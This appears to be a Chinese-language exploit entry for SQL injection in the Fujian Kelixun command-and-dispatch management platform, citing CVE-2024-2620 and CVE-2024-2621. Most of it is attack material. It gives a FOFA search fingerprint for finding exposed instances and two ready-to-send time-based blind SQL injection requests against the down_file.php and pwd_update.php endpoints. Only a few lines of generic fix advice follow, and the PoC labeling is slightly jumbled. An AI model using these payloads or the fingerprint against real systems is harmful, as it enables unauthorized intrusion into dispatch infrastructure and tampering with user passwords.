# 福建科立讯通信指挥调度管理平台SQL注入

- **系统**：福建科立讯通信指挥调度管理平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="指挥调度管理平台"`
- **请求**：`GET /api/client/down_file.php?uuid=1%27%20AND%20(SELECT%205587%20FROM%20(SELECT(SLEEP(5)))pwaA)%20AND%20%27dDhF%27=%27dDhF HTTP/1.1`

**请求体 / payload**
```
1. Fofa
body="指挥调度管理平台"
2、部分界面如下
3、PoC-1(CVE-2024-2620)
Host: your-ip
PoC-2(CVE-2024-2621)
GET /api/client/user/pwd_update.php?usr_number=1%27%20AND%20(SELECT%207872%20FROM%20(SELECT(SLEEP(5)))DHhu)%20AND%20%27pMGM%27=%27pMGM&new_password=1&sign=1 HTTP/1.1
Host: your-ip
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。